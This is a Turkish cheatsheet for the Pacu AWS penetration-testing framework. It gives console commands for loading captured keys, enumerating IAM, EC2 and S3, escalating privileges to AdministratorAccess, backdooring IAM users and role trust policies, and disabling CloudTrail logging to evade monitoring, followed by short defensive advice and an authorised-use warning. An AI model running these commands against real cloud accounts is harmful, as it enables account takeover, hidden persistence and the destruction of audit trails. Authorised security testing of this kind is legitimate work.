# ☁️ Pacu - Kapsamlı Başvuru Rehberi (Cheatsheet)

[🇺🇸 English Version](../README.md)

```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
     Rhino Security Labs AWS İstismar ve Güvenlik Testi Çerçevesi
```

<p align="center">
  <img src="https://img.shields.io/badge/Pacu-AWS_İstismar_Çerçevesi-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Geliştirici-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Kategori-Bulut_Güvenliği-green?style=for-the-badge" alt="Cloud Security">
</p>

<p align="center">
  <b>☁️ AWS bulut altyapılarında sızma testi, ayrıcalık yükseltme (privesc), kimlik bilgisi toplama ve keşif işlemleri için tasarlanmış açık kaynaklı sömürü çerçevesi</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış ve Mimari](#-genel-bakış-ve-mimari)
- [Kurulum](#-kurulum)
- [Oturum Yönetimi ve AWS Anahtarlarını Tanımlama](#-oturum-yönetimi-ve-aws-anahtarlarını-tanımlama)
  - [Ele Geçirilen Kimlik Bilgilerini Ekleme](#ele-geçirilen-kimlik-bilgilerini-ekleme)
  - [Assumed Role ve Geçici Oturum Token'ları](#assumed-role-ve-geçici-oturum-tokenları)
- [Keşif ve Envanter Çıkarma Modülleri](#-keşif-ve-envanter-çıkarma-modülleri)
  - [Mevcut IAM İzinlerini Tarama](#mevcut-iam-izinlerini-tarama)
  - [EC2 ve S3 Varlıklarını Tarama](#ec2-ve-s3-varlıklarını-tarama)
- [AWS Ayrıcalık Yükseltme (Privilege Escalation)](#-aws-ayrıcalık-yükseltme-privilege-escalation)
  - [Otomatik Yetki Yükseltme Taraması](#otomatik-yetki-yükseltme-taraması)
  - [Yetki Yükseltme Modüllerini Çalıştırma](#yetki-yükseltme-modüllerini-çalıştırma)
- [Kalıcılık Sağlama ve Savunma Atlatma](#-kalıcılık-sağlama-ve-savunma-atlatma)
  - [IAM Rollerine ve Kullanıcılarına Arka Kapı Ekleme](#iam-rollerine-ve-kullanıcılarına-arka-kapı-ekleme)
  - [CloudTrail Günlüklerini Kapatma](#cloudtrail-günlüklerini-kapatma)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Yöntemleri ve Tespit](#-savunma-yöntemleri-ve-tespit)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış ve Mimari

**Rhino Security Labs** tarafından geliştirilen **Pacu**, bulut güvenliği dünyasında "AWS için Metasploit" olarak kabul edilir. AWS ortamlarında saldırgan taktik ve tekniklerini simüle etmek için optimize edilmiştir:
- **Modüler Yapı:** Keşif, yanal hareket (lateral movement), ayrıcalık yükseltme, kalıcılık ve veri sızdırma alanlarında 40'tan fazla özelleştirilmiş modül içerir.
- **Gizli İzin Tespiti:** Doğrudan alarm tetiklemeden kullanıcının sahip olduğu IAM yetkilerini ve rollerini haritalandırır.
- **Otomatik Yetki Yükseltme (Privesc):** Bilinen 21+ farklı IAM yanlış yapılandırmasını (`iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy` vb.) otomatik analiz eder ve sömürür.

---

## 📥 Kurulum

```bash
# Depoyu klonlama
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Sanal ortam kurup bağımlılıkları yükleme
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Pacu konsolunu başlatma
python3 pacu.py
```

---

## 🔑 Oturum Yönetimi ve AWS Anahtarlarını Tanımlama

Pacu interaktif bir komut satırı ile açılır. Yeni bir test oturumu oluşturun:

```text
Pacu > set_session musteri_testi
```

### Ele Geçirilen Kimlik Bilgilerini Ekleme
```text
Pacu (musteri_testi) > set_keys
Enter Key Alias: ele_gecirilen_anahtar
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```

### Assumed Role ve Geçici Oturum Token'ları
```text
# Oturumdaki kayıtlı anahtarlar arasında geçiş yapma
Pacu (musteri_testi) > swap_keys
```

---

## 🔍 Keşif ve Envanter Çıkarma Modülleri

### Mevcut IAM İzinlerini Tarama
Hangi kullanıcı kimliğiyle çalıştığınızı ve hangi API çağrılarına izin verildiğini dökün:
```text
# Kimlik bilgilerine bağlı izinleri ve ilkeleri çıkar
Pacu (musteri_testi) > run iam__enum_permissions
Pacu (musteri_testi) > whoami
```

### EC2 ve S3 Varlıklarını Tarama
```text
# Tüm EC2 sanal sunucularını ve güvenlik gruplarını listele
Pacu (musteri_testi) > run ec2__enum

# Erişilebilir S3 depolama kovalarını ve genel erişim izinlerini tara
Pacu (musteri_testi) > run s3__enum
```

---

## ⚡ AWS Ayrıcalık Yükseltme (Privilege Escalation)

AWS'de ayrıcalık yükseltme, standart bir kullanıcının yetkisini artıran yanlış yapılandırılmış IAM izinlerine dayanır.

### Otomatik Yetki Yükseltme Taraması
Mevcut izinleri 21+ bilinen zafiyet yoluna göre tarar:
```text
Pacu (musteri_testi) > run iam__privesc_scan
```
*Çıktı, `iam:PutUserPolicy`, `iam:AttachUserPolicy` veya `iam:CreateAccessKey` gibi istismar edilebilir açıkları listeler.*

### Yetki Yükseltme Modüllerini Çalıştırma
```text
# Tespit edilen açığı kullanarak AdministratorAccess ilkesini kullanıcıya bağlama
Pacu (musteri_testi) > run iam__privesc_scan --exec

# Başka bir yönetici kullanıcı için yeni erişim anahtarı üretme
Pacu (musteri_testi) > run iam__backdoor_users_keys --username hedef_admin
```

---

## 🛡️ Kalıcılık Sağlama ve Savunma Atlatma

### IAM Rollerine ve Kullanıcılarına Arka Kapı Ekleme
```text
# Yedek servis hesabına gizli yeni bir erişim anahtarı ekleme
Pacu (musteri_testi) > run iam__backdoor_users_keys --username backup_service

# Bir role dış hesaptan erişilebilmesi için Trust Policy güncelleme
Pacu (musteri_testi) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```

### CloudTrail Günlüklerini Kapatma
```text
# Aktif denetim günlüklerini (CloudTrail) tespit etme
Pacu (musteri_testi) > run cloudtrail__enum

# SOC izlemesini engellemek için denetim günlüğünü durdurma
Pacu (musteri_testi) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```

---

## ⚡ Hızlı Referans Tablosu

| Amaç | Pacu Komutu |
|------|-------------|
| **Oturum Oluştur/Seç** | `set_session <ISIM>` |
| **AWS Anahtarlarını Ekle** | `set_keys` |
| **Mevcut Kimliği Göster** | `whoami` |
| **IAM İzinlerini Çıkar** | `run iam__enum_permissions` |
| **Yetki Yükseltme Tara** | `run iam__privesc_scan` |
| **S3 Kovalarını Tara** | `run s3__enum` |
| **EC2 Sunucularını Tara** | `run ec2__enum` |
| **CloudTrail Günlüğünü Durdur**| `run cloudtrail__disrupt_logging` |
| **Mevcut Modülleri Listele** | `list` |

---

## 🛡️ Savunma Yöntemleri ve Tespit

1. **GuardDuty ve CloudTrail Alarmları:** Pacu'nun peş peşe yürüttüğü IAM taramaları ve yetki yükseltme denemeleri AWS GuardDuty tarafından hızla tespit edilir.
2. **SCP (Service Control Policies):** AWS Organizations altında yöneticiler dahil kimsenin CloudTrail günlüklerini silemeyeceği veya kapatamayacağı SCP kuralları zorunlu tutulmalıdır.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Pacu yalnızca yazılı izin alınmış AWS sızma testleri ve güvenlik denetimleri için geliştirilmiştir. AWS kullanım koşulları gereğince izinsiz hesaplar üzerinde tarama yapmak suçtur.
